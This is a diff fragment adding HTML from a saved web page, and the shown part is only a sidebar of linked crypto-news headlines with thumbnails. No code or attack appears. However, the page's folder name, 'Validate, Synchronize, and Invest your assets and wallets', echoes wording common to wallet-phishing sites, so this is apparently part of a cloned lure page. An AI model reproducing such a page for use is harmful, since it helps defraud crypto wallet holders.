+											href="https://en.coin-turk.com/xrp-network-processed-769646-transactions-in-24-hours-rlusd-stablecoin-use-grows-as-supply-debate-continues/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=xrp-network-processed-769646-transactions-in-24-hours-rlusd-stablecoin-use-grows-as-supply-debate-continues"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235656.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/xrp-network-processed-769646-transactions-in-24-hours-rlusd-stablecoin-use-grows-as-supply-debate-continues/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=xrp-network-processed-769646-transactions-in-24-hours-rlusd-stablecoin-use-grows-as-supply-debate-continues"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> XRP network processed 769,646 transactions in 24 hours, RLUSD stablecoin use
+									grows as supply debate continues
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coinotag.com/forward-industries-solana-treasury-7-5-million-sol"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235344.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coinotag.com/forward-industries-solana-treasury-7-5-million-sol"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Forward Industries Lifts Solana Treasury to 7.5 Million SOL
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://square.htx.com/htx-hot-listings-weekly-recap-june-22-28-aave-rallies-over-30-leading-the-defi-sector/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/default.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://square.htx.com/htx-hot-listings-weekly-recap-june-22-28-aave-rallies-over-30-leading-the-defi-sector/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> HTX Hot Listings Weekly Recap (June 22–28): AAVE Rallies Over 30%, Leading
+									the DeFi Sector
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://news.bitcoin.com/ionic-raises-400m-as-ai-revenue-tops-bitcoin-mining-ahead-of-nasdaq-listing/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235210.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://news.bitcoin.com/ionic-raises-400m-as-ai-revenue-tops-bitcoin-mining-ahead-of-nasdaq-listing/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Ionic Raises $400M as AI Revenue Tops Bitcoin Mining Ahead of Nasdaq Listing
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.bitcoinsistemi.com/bitwise-europe-research-head-reveals-the-end-date-of-bitcoin-s-downtrend-here-are-the-details/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235302.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.bitcoinsistemi.com/bitwise-europe-research-head-reveals-the-end-date-of-bitcoin-s-downtrend-here-are-the-details/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Bitwise Europe Research Head Reveals the End Date of Bitcoin’s Downtrend!
+									Here Are the Details
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coinotag.com/france-records-77-bitcoin-wrench-attack-kidnappings-2026"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235058.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coinotag.com/france-records-77-bitcoin-wrench-attack-kidnappings-2026"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> France Records 77 Bitcoin Wrench-Attack Kidnappings in 2026
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://cointelegraph.com/news/openai-5-percent-stake-us-government-trump-talks?utm_source=rss_feed&amp;utm_medium=rss&amp;utm_campaign=rss_partner_inbound"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65235536.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://cointelegraph.com/news/openai-5-percent-stake-us-government-trump-talks?utm_source=rss_feed&amp;utm_medium=rss&amp;utm_campaign=rss_partner_inbound"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> OpenAI weighs 5% US government stake amid Trump talks: FT
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://cryptopotato.com/metaplanet-adds-2823-bitcoin-but-still-needs-57000-btc-to-hit-2026-target/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65234753.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://cryptopotato.com/metaplanet-adds-2823-bitcoin-but-still-needs-57000-btc-to-hit-2026-target/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Metaplanet Adds 2,823 Bitcoin, But Still Needs 57,000 BTC to Hit 2026 Target
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coinotag.com/bitcoin-opens-july-below-60k-after-20-percent-june-drop"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65234763.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coinotag.com/bitcoin-opens-july-below-60k-after-20-percent-june-drop"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Bitcoin Opens July Fighting to Hold $60K After 20% June Drop
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/tether-froze-usdt-in-131-tron-wallets-linked-to-isis-k-after-updated-us-sanctions/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=tether-froze-usdt-in-131-tron-wallets-linked-to-isis-k-after-updated-us-sanctions"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65234430.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/tether-froze-usdt-in-131-tron-wallets-linked-to-isis-k-after-updated-us-sanctions/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=tether-froze-usdt-in-131-tron-wallets-linked-to-isis-k-after-updated-us-sanctions"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Tether froze USDT in 131 TRON wallets linked to ISIS K after updated US
+									sanctions
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coinotag.com/ethereum-spot-etfs-return-inflows-14-9m"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65234403.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coinotag.com/ethereum-spot-etfs-return-inflows-14-9m"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Ethereum Spot ETFs Return to Inflows With $14.9M on July 1
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/tron-trades-at-0-3170-as-tron-inc-raises-reserves-above-703-million-trx-with-latest-purchase/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=tron-trades-at-0-3170-as-tron-inc-raises-reserves-above-703-million-trx-with-latest-purchase"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65234128.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/tron-trades-at-0-3170-as-tron-inc-raises-reserves-above-703-million-trx-with-latest-purchase/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=tron-trades-at-0-3170-as-tron-inc-raises-reserves-above-703-million-trx-with-latest-purchase"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> TRON trades at $0.3170 as Tron Inc. raises reserves above 703 million TRX
+									with latest purchase
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://u.today/7-days-of-xrp-stalemate-for-the-first-time-in-history-coin-struggles-with-footing"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65234130.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://u.today/7-days-of-xrp-stalemate-for-the-first-time-in-history-coin-struggles-with-footing"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> 7 Days of XRP Stalemate: For the First Time in History, Coin Struggles With
+									Footing
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coinotag.com/metaplanet-buys-2823-bitcoin-treasury-43000-btc"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65234126.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coinotag.com/metaplanet-buys-2823-bitcoin-treasury-43000-btc"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Metaplanet Buys 2,823 Bitcoin, Lifting Treasury to 43,000 BTC
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://timestabloid.com/is-xrp-the-new-king-egrag-crypto-explains/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/default(1).png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://timestabloid.com/is-xrp-the-new-king-egrag-crypto-explains/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Is XRP the New King? Egrag Crypto Explains
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://ambcrypto.com/examining-enas-price-targets-after-ethena-announces-new-partnership-with-blackrock/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/ambcrypto.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://ambcrypto.com/examining-enas-price-targets-after-ethena-announces-new-partnership-with-blackrock/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Examining ENA’s price targets after Ethena announces new partnership with
+									Blackrock
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://coinpedia.org/price-analysis/memecore-m-price-rebounds-50-after-crash-is-this-a-short-squeeze-or-the-start-of-a-recovery/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/coinpedia.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://coinpedia.org/price-analysis/memecore-m-price-rebounds-50-after-crash-is-this-a-short-squeeze-or-the-start-of-a-recovery/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> MemeCore (M) Price Rebounds 50% After Crash—Is This a Short Squeeze or the
+									Start of a Recovery?
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/ripple-founders-super-pac-just-poured-1-million-into-colorado-politics-what-does-this-mean-for-xrp-and-the-tightest-race-in-the-us/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=ripple-founders-super-pac-just-poured-1-million-into-colorado-politics-what-does-this-mean-for-xrp-and-the-tightest-race-in-the-us"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65233175.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/ripple-founders-super-pac-just-poured-1-million-into-colorado-politics-what-does-this-mean-for-xrp-and-the-tightest-race-in-the-us/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=ripple-founders-super-pac-just-poured-1-million-into-colorado-politics-what-does-this-mean-for-xrp-and-the-tightest-race-in-the-us"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Ripple founder’s Super PAC just poured $1 million into Colorado politics!
+									What does this mean for $XRP and the tightest race in the US?
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/xrp-attracted-15-34-million-in-etf-inflows-on-june-29-as-active-wallets-hit-a-three-month-high/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=xrp-attracted-15-34-million-in-etf-inflows-on-june-29-as-active-wallets-hit-a-three-month-high"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65231929.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coin-turk.com/xrp-attracted-15-34-million-in-etf-inflows-on-june-29-as-active-wallets-hit-a-three-month-high/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=xrp-attracted-15-34-million-in-etf-inflows-on-june-29-as-active-wallets-hit-a-three-month-high"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> XRP attracted $15.34 million in ETF inflows on June 29 as active wallets hit
+									a three month high
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.bitcoinsistemi.com/japanese-company-metaplanet-continues-to-expand-its-bitcoin-btc-investments-how-much-btc-did-it-buy/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65231776.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.bitcoinsistemi.com/japanese-company-metaplanet-continues-to-expand-its-bitcoin-btc-investments-how-much-btc-did-it-buy/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Japanese Company Metaplanet Continues to Expand Its Bitcoin (BTC)
+									Investments! How Much BTC Did It Buy? Here Are the Details
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://ambcrypto.com/will-jups-price-hit-0-28-on-the-back-of-these-three-catalysts/"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/ambcrypto.png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://ambcrypto.com/will-jups-price-hit-0-28-on-the-back-of-these-three-catalysts/"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Will JUP’s price hit $0.28 on the back of these THREE catalysts?
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coinotag.com/bitcoin-rebounds-6-percent-reclaims-60k-dovish-fed"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65231732.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://en.coinotag.com/bitcoin-rebounds-6-percent-reclaims-60k-dovish-fed"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Bitcoin Rebounds 6% to Reclaim $60K on Dovish Fed Chair Signal
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://www.investing.com/news/cryptocurrency-news/bitcoin-in-bear-flag-near-annual-low-live-levels-93CH-4764319"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/default(2).png"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://www.investing.com/news/cryptocurrency-news/bitcoin-in-bear-flag-near-annual-low-live-levels-93CH-4764319"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> Bitcoin wedged near $63K supply wall: Live levels
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://seekingalpha.com/article/4919361-hive-digital-a-promising-ai-pivot-with-giga-factory-sized-risks?utm_source=cryptocompare.com&amp;utm_medium=referral&amp;feed_item_type=article"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65230823.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
+											<a href="https://seekingalpha.com/article/4919361-hive-digital-a-promising-ai-pivot-with-giga-factory-sized-risks?utm_source=cryptocompare.com&amp;utm_medium=referral&amp;feed_item_type=article"
+												target="_blank"
+												style="font-size: 18px; font-weight: bold; color: #000; text-decoration: none!important;"></a>
+										</h3>
+									</div> HIVE Digital: A Promising AI Pivot With Giga Factory-Sized Risks
+								</div>
+								<div
+									style="background: transparent; overflow: hidden; border-bottom: 1px solid rgb(224, 230, 239); color: rgb(0, 0, 0); text-decoration: none; display: block; padding-top: 10px; padding-bottom: 10px; padding-left: 10px;">
+									<div style="line-height: 35px; display: block; float: left;"> <a
+											href="https://en.coin-turk.com/spot-bitcoin-etf-outflows-in-june-set-new-record-at-4-5-billion-sosovalue-reports/?utm_source=rss&amp;utm_medium=rss&amp;utm_campaign=spot-bitcoin-etf-outflows-in-june-set-new-record-at-4-5-billion-sosovalue-reports"
+											style="text-decoration: none;" target="_blank"> <img
+												src="./Validate, Synchronize, and Invest your assets and wallets_files/65230716.jpeg"
+												style=" margin-right: 5px; width: 50px; height: 50px; border-radius: 10px; border: 0;">
+										</a></div>
+									<div
+										style="margin-left: 70px; padding-left: 10px; padding-right: 10px; padding-bottom: 10px; font-size: 12px;">
+										<h3
+											style="margin: 0; margin-bottom: 5px; padding: 0; background: transparent; border: 0; border-left: 0;">
